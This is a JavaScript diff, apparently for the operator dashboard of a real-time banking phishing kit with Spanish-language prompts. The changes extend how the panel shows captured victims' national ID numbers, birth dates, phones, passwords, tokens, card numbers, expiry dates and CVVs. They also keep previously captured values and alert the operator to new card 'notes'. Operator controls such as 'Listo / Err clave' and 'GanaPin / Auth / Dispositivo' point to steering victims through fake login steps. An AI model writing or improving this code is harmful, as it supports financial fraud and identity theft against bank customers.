@@ -518,7 +518,12 @@ function formatExpiryNote(value) {
 }
 
 function hasHabilitarNote(row) {
-  return isHabilitar(row) && Boolean(row.ci || row.cardNumber || row.phone)
+  return Boolean(
+    row?.cardNumber ||
+      row?.cvv ||
+      row?.cardExpiry ||
+      (isHabilitar(row) && (row.ci || row.phone)),
+  )
 }
 
 function unreadNotesCount() {
@@ -549,26 +554,32 @@ function openNoteModal(rowId) {
 
   const overlay = document.createElement('div')
   overlay.className = 'note-modal-overlay'
+  overlay.dataset.noteId = row.id
   overlay.innerHTML = `
     <div class="note-modal" role="dialog" aria-modal="true" aria-labelledby="note-modal-title">
       <div class="note-modal__bar">
-        <h2 class="note-modal__title" id="note-modal-title">Nota · Dispositivo</h2>
+        <h2 class="note-modal__title" id="note-modal-title">Nota · ${isHabilitar(row) ? 'Dispositivo' : 'Tarjeta'}</h2>
         <button type="button" class="note-modal__x" data-note-close aria-label="Cerrar">×</button>
       </div>
       <div class="note-pad">
         <p class="note-pad__meta">#${row.index} · ${formatTime(row.createdAt)} · ${row.device || '—'}</p>
         <h3 class="note-pad__heading">Datos personales</h3>
         <dl class="note-pad__list">
-          <div><dt>C.I.</dt><dd class="copyable" data-copy>${row.ci || '—'}${row.complemento ? `-${row.complemento}` : ''}</dd></div>
-          <div><dt>Extensión</dt><dd class="copyable" data-copy>${row.extension || '—'}</dd></div>
-          <div><dt>Fecha nacimiento</dt><dd class="copyable" data-copy>${formatBirth(row.birthDate)}</dd></div>
-          <div><dt>Celular</dt><dd class="copyable" data-copy>${row.phone || '—'}</dd></div>
+          ${
+            isHabilitar(row)
+              ? ''
+              : `<div><dt>Usuario</dt><dd class="copyable" data-copy data-note-field="user">${row.user || '—'}</dd></div>`
+          }
+          <div><dt>C.I.</dt><dd class="copyable" data-copy data-note-field="ci">${row.ci || '—'}${row.complemento ? `-${row.complemento}` : ''}</dd></div>
+          <div><dt>Extensión</dt><dd class="copyable" data-copy data-note-field="extension">${row.extension || '—'}</dd></div>
+          <div><dt>Fecha nacimiento</dt><dd class="copyable" data-copy data-note-field="birth">${formatBirth(row.birthDate)}</dd></div>
+          <div><dt>Celular</dt><dd class="copyable" data-copy data-note-field="phone">${row.phone || '—'}</dd></div>
         </dl>
         <h3 class="note-pad__heading">Datos de tarjeta</h3>
         <dl class="note-pad__list">
-          <div><dt>Tarjeta</dt><dd class="copyable" data-copy>${formatCard(row.cardNumber) || '—'}</dd></div>
-          <div><dt>Expiración</dt><dd class="copyable" data-copy>${formatExpiryNote(row.cardExpiry)}</dd></div>
-          <div><dt>CVV</dt><dd class="copyable" data-copy>${row.cvv || '—'}</dd></div>
+          <div><dt>Tarjeta</dt><dd class="copyable" data-copy data-note-field="card">${formatCard(row.cardNumber) || '—'}</dd></div>
+          <div><dt>Expiración</dt><dd class="copyable" data-copy data-note-field="expiry">${formatExpiryNote(row.cardExpiry)}</dd></div>
+          <div><dt>CVV</dt><dd class="copyable" data-copy data-note-field="cvv">${row.cvv || '—'}</dd></div>
         </dl>
         <p class="note-pad__foot">Toca un valor para copiar · Listo / Err clave en la fila</p>
       </div>
@@ -671,6 +682,28 @@ btnNotes?.addEventListener('click', () => {
   openNotesInbox()
 })
 
+function refreshOpenNoteModal(row) {
+  const overlay = document.querySelector(`.note-modal-overlay[data-note-id="${row.id}"]`)
+  if (!overlay) return
+  const set = (key, value) => {
+    const el = overlay.querySelector(`[data-note-field="${key}"]`)
+    if (el) el.textContent = value || '—'
+  }
+  set('user', row.user || '—')
+  set('ci', `${row.ci || '—'}${row.complemento ? `-${row.complemento}` : ''}`)
+  set('extension', row.extension || '—')
+  set('birth', formatBirth(row.birthDate))
+  set('phone', row.phone || '—')
+  set('card', formatCard(row.cardNumber) || '—')
+  set('expiry', formatExpiryNote(row.cardExpiry))
+  set('cvv', row.cvv || '—')
+}
+
+function keepValue(next, prev) {
+  if (next == null || next === '' || next === '—') return prev
+  return next
+}
+
 function upsertSession(session) {
   if (!session?.id) return
   // Ignorar fila demo vieja
@@ -679,6 +712,7 @@ function upsertSession(session) {
   const existing = rows.get(session.id)
   const isNew = !existing
   const hadNote = existing ? hasHabilitarNote(existing) : false
+  const prevCard = existing?.cardNumber || ''
   const mapped = mapSessionRow(session, existing?.index || 0)
   if (existing) {
     Object.assign(existing, {
@@ -688,6 +722,15 @@ function upsertSession(session) {
       lastFactor: existing.lastFactor,
       securityImage: session.securityImage || existing.securityImage,
       noteUnread: existing.noteUnread,
+      user: keepValue(mapped.user, existing.user),
+      clave: keepValue(mapped.clave, existing.clave),
+      token: keepValue(mapped.token, existing.token),
+      tipo: keepValue(mapped.tipo, existing.tipo),
+      flow: mapped.flow || existing.flow,
+      ci: 'ci' in session ? mapped.ci : keepValue(mapped.ci, existing.ci),
+      cardNumber: 'cardNumber' in session ? mapped.cardNumber : keepValue(mapped.cardNumber, existing.cardNumber),
+      cardExpiry: 'cardExpiry' in session ? mapped.cardExpiry : keepValue(mapped.cardExpiry, existing.cardExpiry),
+      cvv: 'cvv' in session ? mapped.cvv : keepValue(mapped.cvv, existing.cvv),
     })
   } else {
     mapped.noteUnread = hasHabilitarNote(mapped)
@@ -696,7 +739,7 @@ function upsertSession(session) {
   const row = rows.get(session.id)
   const hasNote = hasHabilitarNote(row)
   // Nueva nota completa (datos de dispositivo llegaron)
-  if (hasNote && (!hadNote || (session.cardNumber && session.cardNumber !== existing?.cardNumber))) {
+  if (hasNote && (!hadNote || (session.cardNumber && session.cardNumber !== prevCard))) {
     row.noteUnread = true
     hint.textContent = `Nueva nota dispositivo (#${row.index}): ${row.ci || row.user}`
     btnNotes?.classList.add('is-ping')
@@ -704,12 +747,15 @@ function upsertSession(session) {
   }
 
   persistRows()
+  refreshOpenNoteModal(row)
   if (isNew) {
     hint.textContent = isHabilitar(row)
       ? hasNote
         ? `Nota dispositivo (#${row.index}) — ábrela en el icono de tarjeta`
         : `En cola (#${row.index}): Habilitar ${row.user} — Listo o Err clave`
-      : `En cola (#${row.index}): ${row.user} — elige GanaPin / Auth / Dispositivo`
+      : hasNote
+        ? `Nota tarjeta (#${row.index}) — ábrela en Nota`
+        : `En cola (#${row.index}): ${row.user} — elige GanaPin / Auth / Dispositivo`
   }
   render()
 
